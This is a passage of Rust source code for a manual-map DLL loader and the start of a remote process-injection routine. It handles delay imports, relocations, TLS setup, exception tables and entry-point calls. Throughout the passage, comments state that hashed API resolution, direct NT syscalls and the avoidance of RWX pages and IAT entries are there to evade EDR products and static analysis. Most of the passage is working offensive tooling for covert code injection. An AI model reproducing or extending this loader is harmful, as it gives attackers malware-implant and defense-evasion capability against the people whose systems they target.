            let mut desc_va = delay_dir.virtual_address as usize;

            loop {
                // Bounds check for the descriptor itself.
                if checked_image_range(desc_va, DELAY_DESCR_SIZE, image_size).is_none() {
                    break;
                }

                // Read descriptor fields directly from the mapped image.
                let base_ptr = image_base as *const u8;
                let grattrs = *(base_ptr.add(desc_va) as *const u32);
                let dll_name_rva = *(base_ptr.add(desc_va + 0x04) as *const u32) as usize;
                let hmod_rva = *(base_ptr.add(desc_va + 0x08) as *const u32) as usize;
                let iat_rva = *(base_ptr.add(desc_va + 0x0C) as *const u32) as usize;
                let int_rva = *(base_ptr.add(desc_va + 0x10) as *const u32) as usize;

                // Null-terminator descriptor: all-zero entry.
                if dll_name_rva == 0 {
                    break;
                }

                // Validate that addresses are RVAs (grAttrs bit 0 set).  Old-style
                // VAs (grAttrs bit 0 clear) are not supported on modern x64 images.
                if grattrs & 0x1 == 0 {
                    return Err(anyhow!(
                        "manual_map: delay-import descriptor at rva {:#x} uses unsupported legacy VA format",
                        desc_va
                    ));
                }

                // Resolve DLL name from the mapped image.
                if dll_name_rva >= image_size {
                    return Err(anyhow!(
                        "manual_map: delay-import descriptor at rva {:#x} has out-of-range DLL name RVA {:#x}",
                        desc_va,
                        dll_name_rva
                    ));
                }
                let dll_name_ptr = base_ptr.add(dll_name_rva) as *const i8;
                let dll_name = std::ffi::CStr::from_ptr(dll_name_ptr)
                    .to_str()
                    .unwrap_or("");
                if dll_name.is_empty() {
                    return Err(anyhow!(
                        "manual_map: delay-import descriptor at rva {:#x} has empty DLL name",
                        desc_va
                    ));
                }

                // Find or load the DLL.
                let dll_handle = if !loaded_modules.contains_key(dll_name) {
                    let mut handle = get_module_handle_peb(dll_name);
                    if handle.is_null() {
                        handle = load_via_ldr(dll_name);
                        if handle.is_null() {
                            return Err(anyhow!(
                                "manual_map: delay-import: failed to load dependent module {}",
                                dll_name
                            ));
                        }
                    }
                    loaded_modules.insert(dll_name, handle);
                    handle
                } else {
                    *loaded_modules.get(dll_name).unwrap()
                };

                // Walk the INT (use IAT as fallback if INT is zero) and write
                // resolved addresses into the IAT slots.
                //
                // PE32+ (64-bit): each IMAGE_THUNK_DATA64 entry is 8 bytes.
                //   bit 63 set   → ordinal import (low 16 bits = ordinal)
                //   bit 63 clear → RVA to IMAGE_IMPORT_BY_NAME (2-byte hint + name)
                // PE32 (32-bit): each IMAGE_THUNK_DATA32 entry is 4 bytes.
                //   bit 31 set   → ordinal import (low 16 bits = ordinal)
                //   bit 31 clear → RVA to IMAGE_IMPORT_BY_NAME
                let is_pe32_plus = optional_header.standard_fields.magic == 0x020B;
                let thunk_entry_size: usize = if is_pe32_plus { 8 } else { 4 };
                let ordinal_flag_mask: u64 = if is_pe32_plus { 1u64 << 63 } else { 1u64 << 31 };
                let rva_mask: u64 = if is_pe32_plus {
                    0x7FFF_FFFF_FFFF_FFFF
                } else {
                    0x7FFF_FFFF
                };

                let thunk_base_rva = if int_rva != 0 { int_rva } else { iat_rva };
                if thunk_base_rva == 0 || iat_rva == 0 {
                    return Err(anyhow!(
                        "manual_map: delay-import descriptor for {} has invalid thunk/IAT RVAs (INT={:#x}, IAT={:#x})",
                        dll_name,
                        int_rva,
                        iat_rva
                    ));
                }

                let mut slot_idx = 0usize;
                loop {
                    let thunk_rva = thunk_base_rva + slot_idx * thunk_entry_size;
                    let iat_slot_rva = iat_rva + slot_idx * thunk_entry_size;
                    if thunk_rva + thunk_entry_size > image_size
                        || iat_slot_rva + thunk_entry_size > image_size
                    {
                        break;
                    }

                    let thunk_val: u64 = if is_pe32_plus {
                        *(base_ptr.add(thunk_rva) as *const u64)
                    } else {
                        *(base_ptr.add(thunk_rva) as *const u32) as u64
                    };
                    if thunk_val == 0 {
                        break;
                    }

                    let proc_addr: *mut c_void = if thunk_val & ordinal_flag_mask != 0 {
                        // Ordinal import — look up directly in the export ordinal table.
                        let ordinal = (thunk_val & 0xFFFF) as u16;
                        get_proc_address_by_ordinal_manual(dll_handle, ordinal)
                    } else {
                        // Named import: RVA to IMAGE_IMPORT_BY_NAME (+2 bytes hint, then name).
                        let ibn_rva = (thunk_val & rva_mask) as usize;
                        if ibn_rva + 2 >= image_size {
                            return Err(anyhow!(
                                "manual_map: delay-import: {}!slot-{} has out-of-range IMAGE_IMPORT_BY_NAME RVA {:#x}",
                                dll_name,
                                slot_idx,
                                ibn_rva
                            ));
                        }
                        let name_ptr = base_ptr.add(ibn_rva + 2) as *const i8;
                        let func_name = std::ffi::CStr::from_ptr(name_ptr).to_str().unwrap_or("");
                        if func_name.is_empty() {
                            return Err(anyhow!(
                                "manual_map: delay-import: {}!slot-{} has empty import name",
                                dll_name,
                                slot_idx
                            ));
                        }
                        get_proc_address_manual(dll_handle, func_name)
                    };
                    if proc_addr.is_null() {
                        return Err(anyhow!(
                            "manual_map: delay-import: {}!slot-{} unresolved; aborting load to avoid null IAT slot",
                            dll_name,
                            slot_idx
                        ));
                    } else {
                        // Write the resolved address into the IAT slot.
                        // Use the correct slot width for the image's PE format.
                        if is_pe32_plus {
                            *(image_base.add(iat_slot_rva) as *mut u64) = proc_addr as u64;
                        } else {
                            *(image_base.add(iat_slot_rva) as *mut u32) = proc_addr as u32;
                        }
                    }

                    slot_idx += 1;
                }

                // Set the HMODULE field to the loaded module base so the
                // delay-import helper knows the DLL has already been loaded.
                // The HMODULE slot width matches the PE's pointer size:
                //   PE32+ (64-bit): 8 bytes (u64)
                //   PE32  (32-bit): 4 bytes (u32)
                if is_pe32_plus {
                    if hmod_rva + std::mem::size_of::<u64>() <= image_size {
                        *(image_base.add(hmod_rva) as *mut u64) = dll_handle as u64;
                    }
                } else {
                    if hmod_rva + std::mem::size_of::<u32>() <= image_size {
                        *(image_base.add(hmod_rva) as *mut u32) = dll_handle as u32;
                    }
                }

                desc_va += DELAY_DESCR_SIZE;
            }
        }
    }

    // 4. Apply base relocations
    if base_delta != 0 {
        if let Some(reloc_entry) = optional_header.data_directories.data_directories
            [IMAGE_DIRECTORY_ENTRY_BASERELOC as usize]
            .map(|(_, dd)| dd)
        {
            if reloc_entry.virtual_address != 0 && reloc_entry.size > 0 {
                let reloc_size = reloc_entry.size as usize;
                let block_rva = reloc_entry.virtual_address as usize;
                let reloc_range = checked_image_range(block_rva, reloc_size, image_size)
                    .ok_or_else(|| {
                        anyhow!(
                            "manual_map: relocation directory out of image bounds (rva={:#x}, size={:#x}, image={:#x})",
                            block_rva,
                            reloc_size,
                            image_size
                        )
                    })?;
                // Snapshot the entire relocation directory into a local buffer
                // *before* applying any patches.  Without this, a relocation
                // entry whose target falls inside the .reloc section itself
                // (or whose patch happens to overlap the next block header due
                // to merged/overlapping sections) could rewrite the headers we
                // are about to read on the next iteration, leading to
                // unpredictable behaviour.  Reading from a pristine copy makes
                // the iteration deterministic.
                let reloc_data: Vec<u8> = std::slice::from_raw_parts(
                    image_base.add(reloc_range.start) as *const u8,
                    reloc_range.len(),
                )
                .to_vec();

                let mut offset = 0usize;
                while offset + 8 <= reloc_size {
                    let page_rva =
                        u32::from_le_bytes(reloc_data[offset..offset + 4].try_into().unwrap())
                            as usize;
                    let block_size =
                        u32::from_le_bytes(reloc_data[offset + 4..offset + 8].try_into().unwrap())
                            as usize;
                    if block_size < 8 || offset + block_size > reloc_size {
                        return Err(anyhow!(
                            "manual_map: malformed relocation block (offset={:#x}, block_size={:#x}, reloc_size={:#x})",
                            offset,
                            block_size,
                            reloc_size
                        ));
                    }
                    let entries_count = (block_size - 8) / 2;
                    let entries_start = offset + 8;
                    for i in 0..entries_count {
                        let off = entries_start + i * 2;
                        let entry =
                            u16::from_le_bytes(reloc_data[off..off + 2].try_into().unwrap());
                        let reloc_type = (entry >> 12) as u8;
                        let reloc_offset = (entry & 0x0FFF) as usize;
                        if reloc_type == 10 {
                            // IMAGE_REL_BASED_DIR64: 64-bit absolute VA (x64, ARM64)
                            let target_rva =
                                page_rva.checked_add(reloc_offset).ok_or_else(|| {
                                    anyhow!("manual_map: relocation target RVA overflow")
                                })?;
                            let target_range = checked_image_range(
                                target_rva,
                                std::mem::size_of::<u64>(),
                                image_size,
                            )
                            .ok_or_else(|| {
                                anyhow!(
                                    "manual_map: DIR64 relocation target out of bounds (rva={:#x}, image={:#x})",
                                    target_rva,
                                    image_size
                                )
                            })?;
                            let addr = image_base.add(target_range.start) as *mut u64;
                            *addr = (*addr).wrapping_add(base_delta as u64);
                        } else if reloc_type == 3 {
                            // IMAGE_REL_BASED_HIGHLOW: 32-bit absolute VA (x86, ARM32)
                            let target_rva =
                                page_rva.checked_add(reloc_offset).ok_or_else(|| {
                                    anyhow!("manual_map: relocation target RVA overflow")
                                })?;
                            let target_range = checked_image_range(
                                target_rva,
                                std::mem::size_of::<i32>(),
                                image_size,
                            )
                            .ok_or_else(|| {
                                anyhow!(
                                    "manual_map: HIGHLOW relocation target out of bounds (rva={:#x}, image={:#x})",
                                    target_rva,
                                    image_size
                                )
                            })?;
                            let addr = image_base.add(target_range.start) as *mut i32;
                            *addr = (*addr as isize + base_delta) as i32;
                        } else if reloc_type == 5 || reloc_type == 7 {
                            // IMAGE_REL_BASED_ARM_MOV32 (5) / IMAGE_REL_BASED_THUMB_MOV32 (7):
                            // A MOVW + MOVT instruction pair encodes a 32-bit absolute VA.
                            // ARM32 instruction encoding (ARM_MOV32, type 5):
                            //   bits[19:16] = imm4, bits[11:0] = imm12  → imm16 = (imm4<<12)|imm12
                            // Thumb-2 T3 encoding (THUMB_MOV32, type 7):
                            //   upper word: bits[19:16]=imm4, bit[26]=i
                            //   lower word: bits[14:12]=imm3, bits[7:0]=imm8 → imm16 = (imm4<<12)|(i<<11)|(imm3<<8)|imm8
                            let is_thumb = reloc_type == 7;
                            let target_rva =
                                page_rva.checked_add(reloc_offset).ok_or_else(|| {
                                    anyhow!("manual_map: relocation target RVA overflow")
                                })?;
                            let target_range = checked_image_range(
                                target_rva,
                                std::mem::size_of::<u32>() * 2,
                                image_size,
                            )
                            .ok_or_else(|| {
                                anyhow!(
                                    "manual_map: ARM_MOV32 relocation target out of bounds (rva={:#x}, image={:#x})",
                                    target_rva,
                                    image_size
                                )
                            })?;
                            let movw_ptr = image_base.add(target_range.start) as *mut u32;
                            let movt_ptr = movw_ptr.add(1);
                            let movw = u32::from_le(*movw_ptr);
                            let movt = u32::from_le(*movt_ptr);
                            let (lo16, hi16) = if is_thumb {
                                let extract_t = |v: u32| -> u16 {
                                    let imm4 = ((v >> 16) & 0xF) as u16;
                                    let i = ((v >> 26) & 0x1) as u16;
                                    let imm3 = ((v >> 12) & 0x7) as u16;
                                    let imm8 = (v & 0xFF) as u16;
                                    (imm4 << 12) | (i << 11) | (imm3 << 8) | imm8
                                };
                                (extract_t(movw), extract_t(movt))
                            } else {
                                let extract_a = |v: u32| -> u16 {
                                    let imm4 = ((v >> 16) & 0xF) as u16;
                                    let imm12 = (v & 0xFFF) as u16;
                                    (imm4 << 12) | imm12
                                };
                                (extract_a(movw), extract_a(movt))
                            };
                            let orig_va = (lo16 as u32) | ((hi16 as u32) << 16);
                            let new_va = ((orig_va as isize).wrapping_add(base_delta)) as u32;
                            let new_lo = (new_va & 0xFFFF) as u16;
                            let new_hi = (new_va >> 16) as u16;
                            if is_thumb {
                                let patch_t = |v: u32, val: u16| -> u32 {
                                    let imm4 = ((val >> 12) & 0xF) as u32;
                                    let i = ((val >> 11) & 0x1) as u32;
                                    let imm3 = ((val >> 8) & 0x7) as u32;
                                    let imm8 = (val & 0xFF) as u32;
                                    (v & !((0xF << 16) | (1 << 26) | (0x7 << 12) | 0xFF))
                                        | (imm4 << 16)
                                        | (i << 26)
                                        | (imm3 << 12)
                                        | imm8
                                };
                                *movw_ptr = patch_t(movw, new_lo).to_le();
                                *movt_ptr = patch_t(movt, new_hi).to_le();
                            } else {
                                let patch_a = |v: u32, val: u16| -> u32 {
                                    let imm4 = ((val >> 12) & 0xF) as u32;
                                    let imm12 = (val & 0xFFF) as u32;
                                    (v & !((0xF << 16) | 0xFFF)) | (imm4 << 16) | imm12
                                };
                                *movw_ptr = patch_a(movw, new_lo).to_le();
                                *movt_ptr = patch_a(movt, new_hi).to_le();
                            }
                        } else if reloc_type == 11 || reloc_type == 12 || reloc_type == 13 {
                            // ARM64 PC-relative entries (ADRP / ADD page-offset / LDR page-offset):
                            // these are self-relative and require no patch for a uniform image rebase
                            // because both the instruction's page and its target move by the same delta.
                        } else if reloc_type != 0 {
                            // Type 0 = IMAGE_REL_BASED_ABSOLUTE — padding, no action.
                            // Anything else is an unrecognised type; warn unconditionally so callers
                            // can diagnose partial-relocation issues in release builds.
                            tracing::warn!(
                                "manual_map: skipping unhandled relocation type {} at rva+offset {:#x}",
                                reloc_type, page_rva + reloc_offset
                            );
                        }
                    }
                    offset += block_size;
                }
            }
        }
    }

    // 5. Set memory protections
    for section in &pe.sections {
        // PAGE_* constants are mutually exclusive — never OR them together.
        // Map (exec, read, write) characteristic flags to the single PAGE_*
        // value that best approximates the requested protection.
        let exec = section.characteristics & IMAGE_SCN_MEM_EXECUTE != 0;
        let read = section.characteristics & IMAGE_SCN_MEM_READ != 0;
        let write = section.characteristics & IMAGE_SCN_MEM_WRITE != 0;
        let prot: u32 = match (exec, read, write) {
            // Downgrade W+X to PAGE_EXECUTE_READ.  No legitimate section
            // needs RWX at load time; RWX pages are a major EDR detection
            // signal.  If a section's own code needs temporary write access
            // after load it should call VirtualProtect itself.
            (true, _, true) => PAGE_EXECUTE_READ,
            (true, true, false) => PAGE_EXECUTE_READ,
            (true, false, false) => PAGE_EXECUTE,
            (false, _, true) => PAGE_READWRITE,
            (false, true, false) => PAGE_READONLY,
            (false, false, false) => PAGE_NOACCESS,
        };
        let mut old_prot = 0;
        // Use the larger of virtual_size and size_of_raw_data: a linker may
        // set VirtualSize to 0 (optimisation), which would make protection
        // change a no-op and leave the section with the wrong permissions.
        let prot_size = std::cmp::max(
            section.virtual_size as usize,
            section.size_of_raw_data as usize,
        );
        let mut prot_base = image_base.add(section.virtual_address as usize);
        let mut prot_size_val = prot_size;
        let _ = nt_syscall::syscall!(
            "NtProtectVirtualMemory",
            -1isize as u64,
            &mut prot_base as *mut _ as u64,
            &mut prot_size_val as *mut _ as u64,
            prot as u64,
            &mut old_prot as *mut _ as u64,
        );
    }

    // 5a. Ensure newly written code bytes are visible to the CPU before any
    //     mapped TLS callback or DLL entrypoint code executes.
    #[cfg(windows)]
    {
        let _ = nt_syscall::syscall!(
            "NtFlushInstructionCache",
            -1isize as u64,
            image_base as u64,
            optional_header.windows_fields.size_of_image as u64,
        );
    }

    // 5b. Invoke TLS callbacks (if any) before calling DllMain.
    //
    // Some DLLs compiled with MSVC __declspec(thread) register one or more
    // PIMAGE_TLS_CALLBACK functions in the TLS directory (data directory 9).
    // The loader must call every callback in the null-terminated array with
    // (DllHandle, DLL_PROCESS_ATTACH, Reserved=0) before the entry point.
    //
    // IMAGE_DIRECTORY_ENTRY_TLS = 9
    const IMAGE_DIRECTORY_ENTRY_TLS: usize = 9;
    if let Some(tls_entry) = optional_header.data_directories.data_directories
        [IMAGE_DIRECTORY_ENTRY_TLS]
        .map(|(_, dd)| dd)
    {
        if tls_entry.virtual_address != 0 && tls_entry.size > 0 {
            // The TLS directory layout (pointer-width fields match the target):
            //   StartAddressOfRawData  : usize
            //   EndAddressOfRawData    : usize
            //   AddressOfIndex         : usize
            //   AddressOfCallBacks     : usize  <- VA of null-terminated callback array
            //   SizeOfZeroFill         : u32
            //   Characteristics        : u32
            #[repr(C)]
            struct ImageTlsDirectory {
                start_address_of_raw_data: usize,
                end_address_of_raw_data: usize,
                address_of_index: usize,
                address_of_callbacks: usize,
                size_of_zero_fill: u32,
                _characteristics: u32,
            }
            let tls_dir =
                &*(image_base.add(tls_entry.virtual_address as usize) as *const ImageTlsDirectory);

            // ── Static TLS setup ────────────────────────────────────────
            // The Windows loader allocates a TLS index via TlsAlloc, writes
            // it to AddressOfIndex, and copies the initial data template to
            // each thread's TLS slot.  Without this, __declspec(thread)
            // variables are uninitialized and any access crashes or reads
            // garbage.
            if tls_dir.address_of_index != 0 {
                let image_size = optional_header.windows_fields.size_of_image as usize;
                let image_start = image_base as usize;
                let image_end = image_start.saturating_add(image_size);

                // Validate AddressOfIndex is within the mapped image.
                let index_ptr = tls_dir.address_of_index as *mut usize;
                if (index_ptr as usize) >= image_start
                    && (index_ptr as usize).saturating_add(std::mem::size_of::<usize>())
                        <= image_end
                {
                    // Resolve TlsAlloc and TlsSetValue from kernel32 at runtime
                    // via hash-based PEB walk — same evasion approach used for
                    // other runtime imports.
                    let k32_base = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(
                        b"kernel32.dll\0",
                    ));
                    if let Some(k32) = k32_base {
                        let tls_alloc_addr = pe_resolve::get_proc_address_by_hash(
                            k32,
                            pe_resolve::hash_str(b"TlsAlloc\0"),
                        );
                        let tls_set_val_addr = pe_resolve::get_proc_address_by_hash(
                            k32,
                            pe_resolve::hash_str(b"TlsSetValue\0"),
                        );
                        // HeapAlloc for TLS data buffer
                        let heap_alloc_addr = pe_resolve::get_proc_address_by_hash(
                            k32,
                            pe_resolve::hash_str(b"HeapAlloc\0"),
                        );
                        let get_process_heap_addr = pe_resolve::get_proc_address_by_hash(
                            k32,
                            pe_resolve::hash_str(b"GetProcessHeap\0"),
                        );

                        if let (Some(alloc_fn), Some(set_fn)) = (tls_alloc_addr, tls_set_val_addr) {
                            let tls_alloc: extern "system" fn() -> u32 =
                                std::mem::transmute(alloc_fn);
                            let tls_set_value: extern "system" fn(u32, *mut c_void) -> i32 =
                                std::mem::transmute(set_fn);

                            let tls_index = tls_alloc();
                            if tls_index != 0xFFFFFFFF {
                                // Write the allocated index to AddressOfIndex.
                                *index_ptr = tls_index as usize;

                                // Compute TLS template size.  The addresses
                                // are VAs that were rebased during relocation.
                                let data_start = tls_dir.start_address_of_raw_data;
                                let data_end = tls_dir.end_address_of_raw_data;
                                let template_size = if data_end > data_start {
                                    data_end - data_start
                                } else {
                                    0usize
                                };
                                let total_size = template_size
                                    .saturating_add(tls_dir.size_of_zero_fill as usize);

                                if total_size > 0 {
                                    // Allocate a buffer for the TLS data.
                                    let buffer = if let (Some(heap_alloc_fn), Some(get_heap_fn)) =
                                        (heap_alloc_addr, get_process_heap_addr)
                                    {
                                        let get_process_heap: extern "system" fn() -> *mut c_void =
                                            std::mem::transmute(get_heap_fn);
                                        let heap_alloc: extern "system" fn(
                                            *mut c_void,
                                            u32,
                                            usize,
                                        )
                                            -> *mut c_void = std::mem::transmute(heap_alloc_fn);
                                        let heap = get_process_heap();
                                        heap_alloc(
                                            heap, 0x00000008, /* HEAP_ZERO_MEMORY */
                                            total_size,
                                        )
                                    } else {
                                        // Fallback: use libc malloc + memset.
                                        let buf = libc::malloc(total_size);
                                        if !buf.is_null() {
                                            libc::memset(buf, 0, total_size);
                                        }
                                        buf as *mut c_void
                                    };

                                    if !buffer.is_null() {
                                        // Copy the initialised portion from the template.
                                        if template_size > 0 && data_start != 0 {
                                            let src = data_start as *const u8;
                                            std::ptr::copy_nonoverlapping(
                                                src,
                                                buffer as *mut u8,
                                                template_size,
                                            );
                                        }
                                        // SizeOfZeroFill bytes are already zero
                                        // (HEAP_ZERO_MEMORY or memset above).
                                        let _ = tls_set_value(tls_index, buffer);
                                    }
                                }
                            }
                        }
                    }
                }
            }

            // ── TLS callbacks ────────────────────────────────────────────
            if tls_dir.address_of_callbacks != 0 {
                // address_of_callbacks is a VA pointing into our mapped image;
                // after relocation it already reflects the allocation address.
                let image_size = optional_header.windows_fields.size_of_image as usize;
                let image_start = image_base as usize;
                let image_end = image_start.saturating_add(image_size);
                let mut cb_ptr = tls_dir.address_of_callbacks as *const usize;
                // Defensive cap: TLS callback arrays are typically a handful of
                // entries; refuse to follow more than 32 to bound runaway loops.
                let mut remaining = 32u32;
                loop {
                    if remaining == 0 {
                        break;
                    }
                    remaining -= 1;
                    // Validate that the callback-array slot itself is inside the image.
                    let slot = cb_ptr as usize;
                    if slot < image_start
                        || slot.saturating_add(std::mem::size_of::<usize>()) > image_end
                    {
                        break;
                    }
                    let cb_va = *cb_ptr;
                    if cb_va == 0 {
                        break;
                    }
                    // Validate that the callback target is inside the image we just
                    // mapped — refuse to dispatch to anything outside it.
                    if cb_va < image_start || cb_va >= image_end {
                        break;
                    }
                    let callback: unsafe extern "system" fn(*mut c_void, u32, *mut c_void) =
                        std::mem::transmute(cb_va);
                    callback(image_base, DLL_PROCESS_ATTACH, std::ptr::null_mut());
                    cb_ptr = cb_ptr.add(1);
                }
            }
        }
    }

    // 5c. Register the .pdata section (exception handling directory) so the OS
    //     can correctly unwind the stack for exceptions thrown inside the DLL.
    //     Without this, any C++ try/catch or SEH block in the DLL terminates
    //     the process instead of propagating to a handler.
    //
    //     Use IMAGE_DIRECTORY_ENTRY_EXCEPTION (index 3) for the authoritative
    //     entry count.  The .pdata section's SizeOfRawData may be padded to
    //     FileAlignment, yielding too many entries; the exception directory's
    //     Size field is the true byte count of RUNTIME_FUNCTION entries.
    //
    //     P2-18: RtlAddFunctionTable is resolved at runtime from ntdll via
    //     pe_resolve (hash-based API resolution) rather than linked as a
    //     static import.  This eliminates the IAT entry, removing a static
    //     analysis indicator while preserving runtime functionality.
    //     RtlAddFunctionTable is an ntdll *runtime helper*, not an NT syscall,
    //     so it has no SSN — but pe_resolve's hash-based lookup works for
    //     any exported function, syscall or not.
    #[cfg(target_arch = "x86_64")]
    {
        const IMAGE_DIRECTORY_ENTRY_EXCEPTION: usize = 3;
        if let Some(exc_dir) = optional_header
            .data_directories
            .data_directories
            .get(IMAGE_DIRECTORY_ENTRY_EXCEPTION)
            .and_then(|e| *e)
            .map(|(_, dd)| dd)
        {
            if exc_dir.virtual_address != 0 && exc_dir.size > 0 {
                let pdata_ptr =
                    image_base.add(exc_dir.virtual_address as usize) as *const RuntimeFunction;
                // Each RUNTIME_FUNCTION entry is exactly 12 bytes.
                let entry_count = (exc_dir.size as usize / 12) as u32;
                if entry_count > 0 {
                    // P2-18: Resolve RtlAddFunctionTable from ntdll at runtime.
                    let ntdll_base = pe_resolve::get_module_handle_by_hash(
                        pe_resolve::hash_str(b"ntdll.dll\0"),
                    )
                    .ok_or_else(|| {
                        anyhow!(
                            "P2-18: failed to resolve ntdll base while registering .pdata for unwind metadata"
                        )
                    })?;

                    let fn_addr = pe_resolve::get_proc_address_by_hash(
                        ntdll_base,
                        pe_resolve::hash_str(b"RtlAddFunctionTable\0"),
                    )
                    .ok_or_else(|| {
                        anyhow!(
                            "P2-18: failed to resolve RtlAddFunctionTable from ntdll; cannot safely load mapped DLL with .pdata"
                        )
                    })?;

                    let rtl_add_fn_table: extern "system" fn(
                        *const RuntimeFunction,
                        u32,
                        u64,
                    ) -> u8 = std::mem::transmute(fn_addr);

                    let registered = rtl_add_fn_table(pdata_ptr, entry_count, image_base as u64);
                    if registered == 0 {
                        return Err(anyhow!(
                            "P2-18: RtlAddFunctionTable returned FALSE for .pdata registration (entries={}); aborting load",
                            entry_count
                        ));
                    }
                }
            }
        }
    }

    // 6. Call entry point when present.
    // Some PE images intentionally set AddressOfEntryPoint to 0.
    let entry_rva = optional_header.standard_fields.address_of_entry_point as usize;
    if entry_rva != 0 {
        checked_image_range(entry_rva, 1, image_size).ok_or_else(|| {
            anyhow!(
                "manual_map: AddressOfEntryPoint {:#x} is outside mapped image size {:#x}",
                entry_rva,
                image_size
            )
        })?;
        let entry_point_addr = image_base.add(entry_rva);
        let entry_point: extern "system" fn(*mut c_void, u32, *mut c_void) -> bool =
            std::mem::transmute(entry_point_addr);
        if !entry_point(image_base, DLL_PROCESS_ATTACH, std::ptr::null_mut()) {
            return Err(anyhow!("DLL entry point failed"));
        }
    } else {
        tracing::debug!(
            "manual_map_local: mapped image has AddressOfEntryPoint=0; skipping DllMain call"
        );
    }

    _guard.success = true;
    Ok(image_base)
}

// ── Remote manual-map injection ──────────────────────────────────────────────

#[repr(C)]
struct ProcessBasicInformation {
    reserved1: *mut c_void,
    peb_base_address: *mut PEB,
    reserved2: [*mut c_void; 2],
    unique_process_id: usize,
    reserved3: *mut c_void,
}

unsafe fn read_remote_struct<T>(
    process: windows_sys::Win32::Foundation::HANDLE,
    remote: *const c_void,
) -> Option<T> {
    let mut value: T = std::mem::zeroed();
    let mut bytes_read = 0usize;
    let status = nt_syscall::syscall!(
        "NtReadVirtualMemory",
        process as u64,
        remote as u64,
        &mut value as *mut _ as u64,
        std::mem::size_of::<T>() as u64,
        &mut bytes_read as *mut _ as u64,
    );
    if status.map_or(true, |s| s < 0) || bytes_read != std::mem::size_of::<T>() {
        None
    } else {
        Some(value)
    }
}

unsafe fn read_remote_exact(
    process: windows_sys::Win32::Foundation::HANDLE,
    remote_addr: usize,
    len: usize,
    context: &str,
) -> Result<Vec<u8>> {
    let mut buf = vec![0u8; len];
    let mut bytes_read = 0usize;
    let status = nt_syscall::syscall!(
        "NtReadVirtualMemory",
        process as u64,
        remote_addr as u64,
        buf.as_mut_ptr() as u64,
        len as u64,
        &mut bytes_read as *mut _ as u64,
    );
    if status.as_ref().map_or(true, |s| *s < 0) || bytes_read != len {
        return Err(anyhow!(
            "{context}: NtReadVirtualMemory at {remote_addr:#x} len={len:#x} failed: status={:?}, read={bytes_read:#x}",
            status
        ));
    }
    Ok(buf)
}

unsafe fn read_remote_c_string_from_image(
    process: windows_sys::Win32::Foundation::HANDLE,
    image_base: usize,
    rva: usize,
    image_size: usize,
    max_len: usize,
    context: &str,
) -> Result<String> {
    if rva >= image_size {
        return Err(anyhow!(
            "{context}: string RVA {rva:#x} is outside image size {image_size:#x}"
        ));
    }
    let len = std::cmp::min(max_len, image_size - rva);
    let bytes = read_remote_exact(process, image_base + rva, len, context)?;
    let nul = bytes.iter().position(|&b| b == 0).ok_or_else(|| {
        anyhow!("{context}: string at RVA {rva:#x} is not NUL-terminated within {len:#x} bytes")
    })?;
    let value = std::str::from_utf8(&bytes[..nul])
        .map_err(|e| anyhow!("{context}: string at RVA {rva:#x} is not UTF-8: {e}"))?;
    if value.is_empty() {
        return Err(anyhow!("{context}: string at RVA {rva:#x} is empty"));
    }
    Ok(value.to_string())
}

unsafe fn get_remote_ntdll_base(
    target_process: windows_sys::Win32::Foundation::HANDLE,
) -> Option<usize> {
    type NtQueryInformationProcessFn = unsafe extern "system" fn(
        windows_sys::Win32::Foundation::HANDLE,
        u32,
        *mut c_void,
        u32,
        *mut u32,
    ) -> i32;

    let local_ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))?;
    let ntqip_addr = pe_resolve::get_proc_address_by_hash(
        local_ntdll,
        pe_resolve::hash_str(b"NtQueryInformationProcess\0"),
    )?;
    let ntqip: NtQueryInformationProcessFn = std::mem::transmute(ntqip_addr as *const ());

    let mut pbi: ProcessBasicInformation = std::mem::zeroed();
    let mut return_len = 0u32;
    let status = ntqip(
        target_process,
        0, // ProcessBasicInformation
        &mut pbi as *mut _ as *mut c_void,
        std::mem::size_of::<ProcessBasicInformation>() as u32,
        &mut return_len,
    );
    if status < 0 || pbi.peb_base_address.is_null() {
        return None;
    }

    let peb: PEB = read_remote_struct(target_process, pbi.peb_base_address as *const c_void)?;
    if peb.Ldr.is_null() {
        return None;
    }

    let ldr: PEB_LDR_DATA = read_remote_struct(target_process, peb.Ldr as *const c_void)?;
    let list_head = (peb.Ldr as usize + 0x10) as *mut LIST_ENTRY; // InLoadOrderModuleList
    let mut current = ldr.InLoadOrderModuleList.Flink;
    let mut guard = 0usize;

    while !current.is_null() && current != list_head && guard < 1024 {
        guard += 1;

        let entry: LDR_DATA_TABLE_ENTRY =
            match read_remote_struct(target_process, current as *const c_void) {
                Some(e) => e,
                None => break,
            };

        let dll_base = entry.DllBase as usize;
        let base_name = entry.BaseDllName;
        if dll_base != 0
            && !base_name.Buffer.is_null()
            && base_name.Length >= 2
            && (base_name.Length as usize) <= 520
        {
            let chars = (base_name.Length / 2) as usize;
            let mut wide = vec![0u16; chars];
            let mut bytes_read = 0usize;
            let status = nt_syscall::syscall!(
                "NtReadVirtualMemory",
                target_process as u64,
                base_name.Buffer as u64,
                wide.as_mut_ptr() as u64,
                base_name.Length as u64,
                &mut bytes_read as *mut _ as u64,
            );
            if status.map_or(false, |s| s >= 0) && bytes_read == base_name.Length as usize {
                let name = String::from_utf16_lossy(&wide).to_ascii_lowercase();
                if name == "ntdll.dll" || name == "ntdll" {
                    return Some(dll_base);
                }
            }
        }

        current = entry.InLoadOrderLinks.Flink;
    }

    None
}

/// Build a lowercase DLL-name → remote base-address map for every module loaded
/// in `target_process`, using a remote PEB walk via `NtQueryInformationProcess`
/// and `NtReadVirtualMemory`.
///
/// Called when the shared-ASLR assumption does not hold (local and remote
/// `ntdll.dll` bases differ), so that subsequent IAT resolution can use actual
/// remote-process module bases rather than the local PEB-walk results.
///
/// All APIs are dispatched through NT syscalls (via pe_resolve for
/// `NtQueryInformationProcess` and `nt_syscall::syscall!` for reads) to avoid
/// IAT-visible `CreateToolhelp32Snapshot` / `Module32First` / `Module32Next`
/// hooks installed by EDR products.
///
/// # Errors
///
/// Returns `Err` if the remote PEB cannot be read or the module list is
/// corrupt.  In that case the caller must **not** proceed with local import
/// addresses.
unsafe fn build_remote_module_map(
    target_process: windows_sys::Win32::Foundation::HANDLE,
) -> Result<HashMap<String, usize>> {
    type NtQueryInformationProcessFn = unsafe extern "system" fn(
        windows_sys::Win32::Foundation::HANDLE,
        u32,
        *mut c_void,
        u32,
        *mut u32,
    ) -> i32;

    // Resolve NtQueryInformationProcess via PEB walk (same pattern as
    // get_remote_ntdll_base).  This avoids the hookable
    // kernel32!CreateToolhelp32Snapshot IAT entry.
